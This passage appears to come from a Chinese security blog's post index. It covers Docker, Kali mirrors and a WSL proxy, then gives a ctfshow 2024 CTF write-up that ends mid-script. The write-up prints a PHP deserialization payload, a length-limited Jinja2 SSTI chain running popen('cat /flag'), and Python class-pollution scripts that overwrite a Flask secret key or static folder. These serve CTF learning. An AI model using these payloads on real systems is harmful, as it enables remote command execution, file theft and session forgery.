alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6bf426412d004c1e88db877f6816fd1e.png" alt="img"></p><p>利用思路：<br>php浮点数常量NAN和INF:<br>使用浮点常量INF分别给ctf和dsb变量赋值，长度都为3，dsb是字符串类型，ctf是浮点型，由于MD5是以字符串形式进行加密的，所以他们的MD5值是相等的。这样就达到了绕过的目的。</p><p>2.dsb会被转化成字符串类型，但是ctf不会，所以可以利用不同类型的相同字符绕过。比如：</p><p>md5(‘123’)=md5(123)</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker run 运行镜像</title>
      <link href="/posts/3445c523.html"/>
      <url>/posts/3445c523.html</url>
      
        <content type="html"><![CDATA[<p>docker run ：创建一个新的容器并运行一个命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line"></span><br><span class="line">-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</span><br><span class="line"></span><br><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line"></span><br><span class="line">-i: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line"></span><br><span class="line">-P: 随机端口映射，容器内部端口随机映射到主机的端口</span><br><span class="line"></span><br><span class="line">-p: 指定端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line"></span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line"></span><br><span class="line">--name=&quot;nginx-lb&quot;: 为容器指定一个名称；</span><br><span class="line"></span><br><span class="line">--dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；</span><br><span class="line"></span><br><span class="line">--dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；</span><br><span class="line"></span><br><span class="line">-h &quot;mars&quot;: 指定容器的hostname；</span><br><span class="line"></span><br><span class="line">-e username=&quot;ritchie&quot;: 设置环境变量；</span><br><span class="line"></span><br><span class="line">--env-file=[]: 从指定文件读入环境变量；</span><br><span class="line"></span><br><span class="line">--cpuset=&quot;0-2&quot; or --cpuset=&quot;0,1,2&quot;: 绑定容器到指定CPU运行；</span><br><span class="line"></span><br><span class="line">-m :设置容器使用内存最大值；</span><br><span class="line"></span><br><span class="line">--net=&quot;bridge&quot;: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</span><br><span class="line"></span><br><span class="line">--link=[]: 添加链接到另一个容器；</span><br><span class="line"></span><br><span class="line">--expose=[]: 开放一个端口或一组端口；</span><br><span class="line"></span><br><span class="line">--volume , -v: 绑定一个卷</span><br></pre></td></tr></table></figure><p>Docker 镜像只有运行起来，才会创建一个容器，才能提供对外服务</p><p>这里我们先不解释什么是镜像，我们只解释它们之间的关系和类比</p><p>我们先说镜像，镜像有点类似于已经打包好了，放在腾讯服务器上的，但还没有装在电脑上的 QQ 安装程序</p><p>那么容器，就相当于一个已经在用户电脑上安装好的 QQ 软件，只要输入 QQ 号和密码，就可以使用了</p><p>它们之间一样么？ 不一样的</p><ol><li>QQ 安装程序，人人都可以下，但是只要不安装，它就不能使用，它只是一个安装程序而已</li><li>已经安装好的 QQ 程序，这时候就不是人人都能用了，只有电脑的主人才能用，而且这时候可以登录然后聊天了</li></ol><p>相比较于 Docker ，我们只有把一个镜像 <code>run</code> 起来，它才能对外提供服务</p><p>将一个镜像转换成容器，使用的就是 <code>docker run</code> 命令</p><h2 id="Docker-Hello-World">Docker Hello World</h2><p><code>docker run</code> 命令可以从一个镜像创建一个容器，并运行一个应用程序</p><p>比如下面的 <code>docker run</code> 命令从 <code>ubuntu:17.10</code> 镜像创建一个容器，并运行 <code>echo &quot;Hello world&quot;</code> 服务输出 Hello world</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run ubuntu:17.10 /bin/echo &quot;Hello world&quot;</span><br><span class="line">Unable to find image &#x27;ubuntu:17.10&#x27; locally</span><br><span class="line">17.10: Pulling from library/ubuntu</span><br><span class="line">68393378db12: Pull complete </span><br><span class="line">9e3366501e0e: Pull complete </span><br><span class="line">156ec05da9a5: Pull complete </span><br><span class="line">281cba1133d9: Pull complete </span><br><span class="line">0acdc2cc8ed1: Pull complete </span><br><span class="line">Digest: sha256:20ed22f88148889c94970cb325b5341f455c820aa6d3289ce4b721b14c78c242</span><br><span class="line">Status: Downloaded newer image for ubuntu:17.10</span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>docker</td><td>Docker 的二进制执行文件</td></tr><tr><td>run</td><td>与前面的 docker 组合来运行一个容器</td></tr><tr><td>ubuntu:17.10</td><td>指定要运行的镜像，Docker 首先从本地主机上查找镜像是否存在 如果不存在，Docker 就会从镜像仓库 Docker Hub 下载公共镜像</td></tr><tr><td>/bin/echo &quot;Hello world</td><td>在启动的容器里执行的命令</td></tr></tbody></table><p>更多 <code>docker start</code> 命令使用方法，可以访问 <a href="https://twle.cn/l/yufei/docker/docker-basic-start-command.html">docker start 命令</a></p><h2 id="运行交互式的容器">运行交互式的容器</h2><p>使用 <code>docker run</code> 如果添加了 <code>-i</code> 和 <code>-t</code> 或者 <code>-it</code> 参数，那么 Docker 就会创建一个交互式的容器，可以实现应答模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run -i -t ubuntu:17.10 /bin/bash</span><br><span class="line">root@1bc08b56d08f:/#  </span><br></pre></td></tr></table></figure><blockquote><p>这次执行的时候没有从远程拉取 ubuntu:17.10 镜像了，而是使用的本地版本</p></blockquote><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-t</td><td>在新容器内指定一个伪终端或终端</td></tr><tr><td>-i</td><td>允许对容器内的标准输入 ( STDIN ) 进行交互</td></tr></tbody></table><p>当出现 <code>root@1bc08b56d08f:/#</code> 之后，就进入了 <code>ubuntu 17.10</code> 系统的容器</p><p>我们可以在 <code>root@1bc08b56d08f:/#</code> 之后输入一些 <a href="https://twle.cn/l/yufei/man/man-basic-index.html">Linux 命令</a> ，比如使用 <code>cat /proc/version</code> 和 <code>ls</code> 分别查看当前系统的版本信息和当前目录下的文件列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@1bc08b56d08f:/# cat /proc/version</span><br><span class="line">Linux version 4.9.87-linuxkit-aufs (root@95fa5ec30613) (gcc version 6.4.0 (Alpine 6.4.0) ) #1 SMP Wed Mar 14 15:12:16 UTC 2018</span><br><span class="line">root@1bc08b56d08f:/# ls</span><br><span class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure><p>如果要推出交互式容器，可以运行 <code>exit</code> 命令或者使用 <code>CTRL+D</code> 组合键</p><h2 id="后台模式">后台模式</h2><p>跟所有的 <code>Linux</code> 应用程序一样，如果不使用后台模式，那么它们一直会独占 <strong>终端</strong>，如果退出了终端，那么容器就会自动退出</p><p>所以，一般情况下我们都希望使用后台模式运行一个容器，可以添加 <code>-d</code> 参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run -d ubuntu:17.10 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br><span class="line">4558b3b54da0ff34fa4c4bc6fb2c3303b2b3f602fad046b205b342b9babc21d6</span><br></pre></td></tr></table></figure><p>使用后台模式，日志就不会输出到标准输出了，也就是不会显示在 <strong>终端</strong> 上了</p><p>这时候显示出来的，当前容器的 ID。</p><p>每个容器的 ID 都是唯一的，我们可以通过容器的 ID 来查看容器的状态和容器的所有信息</p><h2 id="查看容器运行状况">查看容器运行状况</h2><p>如果想要查看容器的运行状况，可以使用 <code>docker ps</code> 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID  IMAGE        ...  STATUS        ...</span><br><span class="line">4558b3b54da0  ubuntu:17.10 ...  Up 2 minutes  ...</span><br></pre></td></tr></table></figure><p><code>docker ps</code> 命令只会显示所有正在运行的容器</p><p>如果想要查看所有的容器，那么需要添加 <code>-a</code> 参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID  ...  STATUS                    ...</span><br><span class="line">4558b3b54da0  ...  Up 2 minutes              ...</span><br><span class="line">e08201b591cd  ...  Exited (0) 15 minutes ago ...</span><br><span class="line">6801e4604a32  ...  Exited (0) 15 minutes ago ...</span><br></pre></td></tr></table></figure><p>更多 <code>docker ps</code> 命令使用方法，可以访问 <a href="https://twle.cn/l/yufei/docker/docker-basic-ps-command.html">docker ps 命令</a></p><h2 id="查看容器的运行日志">查看容器的运行日志</h2><p>后台容器的输出不会显示在 <strong>终端</strong> 上，而是被 <code>Docker</code> 收集起来了</p><p>我们可以通过 <code>docker logs</code> 命令查看容器的日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;container_id&gt;</span><br></pre></td></tr></table></figure><p>例如想要查看容器 <code>4558b3b54da0</code> 的日志，可以使用下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker logs 4558b3b54da0</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>更多 <code>docker logs</code> 命令使用方法，可以访问 <a href="https://twle.cn/l/yufei/docker/docker-basic-logs-command.html">docker logs 命令</a></p><h2 id="停止容器">停止容器</h2><p>如果想要主动停止容器，可以使用 <code>docker stop</code> 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop &lt;container_id&gt;</span><br></pre></td></tr></table></figure><p>我们可以使用下面的命令来停止容器 <code>4558b3b54da0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker stop 4558b3b54da0</span><br><span class="line">4558b3b54da0</span><br></pre></td></tr></table></figure><p><code>docker stop</code> 命令的返回值是停止的容器 ID</p><p>现在通过 <code>docker ps -a</code> 查看，容器已经停止工作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID  ... STATUS                     ...</span><br><span class="line">6801e4604a32  ... Exited (0) 15 minutes ago  ...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali换源</title>
      <link href="/posts/35bc9a82.html"/>
      <url>/posts/35bc9a82.html</url>
      
        <content type="html"><![CDATA[<p>一.更换源<br>1.<br>进入Kali Linux系统并打开命令行窗口，输入“ sudo -i ”回车输入密码以获取系统最高权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su                        #获取系统最高权限命令</span><br></pre></td></tr></table></figure><ol start="2"><li>输入vim /etc/apt/sources.list编辑软件源配置文件。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list      #使用vim访问源</span><br></pre></td></tr></table></figure><ol start="3"><li>将官方源如下加入“ # ”注释掉。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#官方源</span><br><span class="line"></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><ol start="4"><li>加入以下任意一种国内源即可。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#浙大</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#东软大学</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#重庆大学</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><ol start="5"><li>加入之后点击“ esc ”退出编辑，输入“ :wq”回车保存并退出。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:wq                     #保存并退出命令</span><br></pre></td></tr></table></figure><p>二.更新命令<br>输入以下命令以进行更新(在非root状态下需在前面加入“ sudo ”)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update          #更新索引</span><br><span class="line">apt-get upgrade         #更新软件</span><br><span class="line">apt-get dist-upgrade    #升级</span><br><span class="line">apt-get clean           #删除缓存包</span><br><span class="line">apt-get autoclean       #删除未安装的deb包</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 子系统 WSL使用系统代理</title>
      <link href="/posts/f5bf104a.html"/>
      <url>/posts/f5bf104a.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="以Ubuntu-Clash为例">以Ubuntu + Clash为例</h2><p>由Jeza Chen 发表于 June 3, 2020</p><p>最近使用WSL发现无法访问github相关的网站，基本都是Connection Refused，即便Windows系统使用了Clash也不能访问，按照网上一些教程，需要在WSL上进行一些配置才能用到系统的代理。</p><p>下面的操作基于WSL下的Ubuntu 20.04 LTS，主机代理软件为<a href="https://github.com/Dreamacro/clash">Clash</a>。</p><ol><li><p>在Clash软件找到HTTP代理端口(即软件里面的Port)，如下图的7890。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/clash-screenshot.png" alt="Clash截图"></p></li><li><p>在c盘的用户文件中创建.wslconfig文件，复制以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   [experimental]</span><br><span class="line">   autoMemoryReclaim=gradual</span><br><span class="line">networkingMode=mirrored</span><br><span class="line">   dnsTunneling=true</span><br><span class="line">   firewall=true</span><br><span class="line">   autoProxy=true</span><br></pre></td></tr></table></figure></li><li><p>在WSL的终端上输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">，在末行写入</span><br><span class="line">export http_proxy=127.0.0.1:7890</span><br><span class="line"></span><br><span class="line">export https_proxy=127.0.0.1:7890</span><br></pre></td></tr></table></figure><p><strong>注意这里的7890是上图Clash的HTTP代理端口号，请替换成自己本机的端口。</strong></p></li><li><p>关闭终端重新打开，此时输入<code>wget google.com</code>看看代理能不能正常工作。</p></li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/wsl-wget-google.png" alt="Wget谷歌官网截图"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow单身杯2024wp</title>
      <link href="/posts/b37bd168.html"/>
      <url>/posts/b37bd168.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="签到·好玩的PHP">签到·好玩的PHP</h4><p>考点：序列化反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   error_reporting(0);</span><br><span class="line">   highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">   class ctfshow &#123;</span><br><span class="line">       private $d = &#x27;&#x27;;</span><br><span class="line">       private $s = &#x27;&#x27;;</span><br><span class="line">       private $b = &#x27;&#x27;;</span><br><span class="line">       private $ctf = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">       public function __destruct() &#123;</span><br><span class="line">           $this-&gt;d = (string)$this-&gt;d;</span><br><span class="line">           $this-&gt;s = (string)$this-&gt;s;</span><br><span class="line">           $this-&gt;b = (string)$this-&gt;b;</span><br><span class="line"></span><br><span class="line">           if (($this-&gt;d != $this-&gt;s) &amp;&amp; ($this-&gt;d != $this-&gt;b) &amp;&amp; ($this-&gt;s != $this-&gt;b)) &#123;</span><br><span class="line">               $dsb = $this-&gt;d.$this-&gt;s.$this-&gt;b;</span><br><span class="line"></span><br><span class="line">               if ((strlen($dsb) &lt;= 3) &amp;&amp; (strlen($this-&gt;ctf) &lt;= 3)) &#123;</span><br><span class="line">                   if (($dsb !== $this-&gt;ctf) &amp;&amp; ($this-&gt;ctf !== $dsb)) &#123;</span><br><span class="line">                       if (md5($dsb) === md5($this-&gt;ctf)) &#123;</span><br><span class="line">                           echo file_get_contents(&quot;/flag.txt&quot;);</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   unserialize($_GET[&quot;dsbctf&quot;]); </span><br></pre></td></tr></table></figure><blockquote><p>代码审计，发现需要传两个md5值相同的不同字符串，有长度限制不能进行强碰撞，尝试数组绕过也不行，这里注意到可以让其类型不同而值相同进行绕过，构造 pop 链</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow &#123;</span><br><span class="line">        private $d = &#x27;1&#x27;;</span><br><span class="line">        private $s = &#x27;2&#x27;;</span><br><span class="line">        private $b = &#x27;3&#x27;;</span><br><span class="line">        private $ctf = 123;</span><br><span class="line"></span><br><span class="line">        public function __destruct() &#123;</span><br><span class="line">            $this-&gt;d = (string)$this-&gt;d;</span><br><span class="line">            $this-&gt;s = (string)$this-&gt;s;</span><br><span class="line">            $this-&gt;b = (string)$this-&gt;b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$a = new ctfshow();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">//O%3A7%3A%22ctfshow%22%3A4%3A%7Bs%3A10%3A%22%00ctfshow%00d%22%3Bs%3A1%3A%221%22%3Bs%3A10%3A%22%00ctfshow%00s%22%3Bs%3A1%3A%222%22%3Bs%3A10%3A%22%00ctfshow%00b%22%3Bs%3A1%3A%223%22%3Bs%3A12%3A%22%00ctfshow%00ctf%22%3Bi%3A123%3B%7D</span><br></pre></td></tr></table></figure><blockquote><p>GET传入得到flag：ctfshow{ee28d4d9-8c54-4dc2-a1c4-5682bbbbe119}</p></blockquote><h4 id="ezzz-ssti">ezzz_ssti</h4><blockquote><p>考点：ssti漏洞长度绕过</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241115134810233.png" alt="image-20241115134810233"></p><blockquote><p>输入111看看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241115134844072.png" alt="image-20241115134844072"></p><blockquote><p>猜测存在ssti漏洞，所以用16验证，发现确实存在</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241115134947551.png" alt="image-20241115134947551"></p><blockquote><p>于是进行ssti漏洞注入，发现进行了字数限制，经过测试，发现限制在了40个字符以内</p><p>可以利用全局变量进行绕过，最后构造 payload</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set x=config.update(a=config.update)%&#125;</span><br><span class="line">&#123;%set x=config.a(f=lipsum.__globals__)%&#125;</span><br><span class="line">&#123;%set x=config.a(o=config.f.os)%&#125;</span><br><span class="line">&#123;%set x=config.a(p=config.o.popen)%&#125;</span><br><span class="line">&#123;&#123;config.p(&quot;cat /flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241115140002044.png" alt="image-20241115140002044"></p><blockquote><p>ctfshow{89f67afc-5d2b-4de4-b700-2aaaa7428a7c}</p></blockquote><h4 id="ez-inject">ez_inject</h4><blockquote><p>考点：原型链污染</p></blockquote><blockquote><p>打开网页，发现是个登录窗口</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125144046562.png" alt="image-20241125144046562"></p><blockquote><p>先随便注册登录一下看看。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125144209368.png" alt="image-20241125144209368"></p><blockquote><p>根据提示，知道在注册的地方可以进行原型链污染。</p><p>先看看cookie</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125144334162.png" alt="image-20241125144334162"></p><blockquote><p>不是admin。而且这是flask的session，我们也不知道密码。</p><p>所以原型链污染直接将密码改变，然后根据密码自己构造一个session。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url = &quot;http://3b4e7805-6cda-4195-8501-75be8c9d1787.challenge.ctf.show/register&quot;</span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    &quot;username&quot;: &quot;wi&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;wi&quot;,</span><br><span class="line">    &quot;__init__&quot;: &#123;</span><br><span class="line">        &quot;__globals__&quot;: &#123;</span><br><span class="line">            &quot;app&quot;: &#123;</span><br><span class="line">                &quot;config&quot;: &#123;</span><br><span class="line">                    &quot;SECRET_KEY&quot;: &quot;baozongwi&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, json=payload)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><blockquote><p>剩下的就是ssti注入，这是预期解</p><p>还有非预期解，直接原型链污染将静态目录污染成根目录，然后访问/static/flag就能拿到flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url = &quot;https://d3dbdfcc-6bba-49fa-b4b5-6c5e00484791.challenge.ctf.show/register&quot;</span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    &quot;username&quot;: &quot;test&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;test&quot;,</span><br><span class="line">    &quot;__init__&quot;: &#123;</span><br><span class="line">        &quot;__globals__&quot;: &#123;</span><br><span class="line">            &quot;app&quot;: &#123;</span><br><span class="line">                &quot;_static_folder&quot;:&quot;/&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, json=payload,verify=False)</span><br><span class="line"></span><br><span 